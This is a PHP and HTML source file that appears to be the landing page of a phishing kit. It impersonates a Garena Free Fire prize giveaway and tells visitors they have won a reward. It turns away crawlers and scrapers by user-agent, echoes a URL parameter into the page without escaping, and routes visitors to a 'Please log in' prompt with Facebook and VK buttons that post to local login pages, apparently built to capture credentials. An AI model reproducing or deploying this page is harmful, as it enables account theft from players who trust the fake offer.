<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://www.facebook.com/IdhamDotID');
die();
}

    error_reporting(0);
    $namaloajg = $_GET['name'];
    $freeman1 = ucfirst($namaloajg);
	$freeman08 = array('1', '12', '13', '14', '15', '16' ,'1');
    $reward = $freeman08[rand(0, (count($freeman08)-1))];
    

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta property="og:title" content="Selamat <?php echo $freeman1;?>. Kamu mendapatkan Hadiah Silahkan Klik & Ambil - Garena Free Fire">
	<meta property="og:description" content="Selamat <?php echo $freeman1;?>. Kamu mendapatkan Hadiah Silahkan Klik & Ambil - Garena Free Fire">
	<meta property="og:image" content="gmb/41707458_573073549791933_8041285127327711232_n.jpg">
    <link rel="stylesheet" href="./assets/css/miraipedia.css">
    <link rel="stylesheet" href="./assets/css/animate.css">
    <link rel="shorcut icon" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png"/>
    <title>Garena Free Fire</title>
</head>
<body>
    <div class="miraipedia">
        <div class="contentmirai">
            <div class="content-txt">
<img src="freeman08/man1.png"width="100%"height="100%">
<img src="freeman08/man2.png"width="100%"height="100%">
<img src="freeman08/man7.png"width="100%"height="100%">
<img src="freeman08/man6.png"width="100%"height="100%">
                    
                    
                    
                    <form method="POST">
                        <button type="submit" class="btn-contentmirai" name="reward" value="<?php echo $reward;?>">BELI SEKARANG</button>
                </form>
            </div>
        </div>
        <?php
        if (isset($_POST['reward'])) { 
            $mirai = $_POST['reward'];
            echo "<div class='idhaam69'><div class='miraipedia-confirm animated wobble'>
            <div class='txt-confirm'>Please log in</div>
            <form id='idhaam69' action='./login/index.php' method='POST'>
                <button type='submit' class='btn-contentmiraii' name='mirai-reward' value='$mirai'>FB</button>
            </form>
            <form id='idhaam69' action='./login/index2.php' method='GET'>
                <button type='submit' class='btn-contentmiraii' name='name' value='$freeman1'>VK</button>
            </form>
        </div></div>";}
        ?>
        
    </div>
</body>
</html>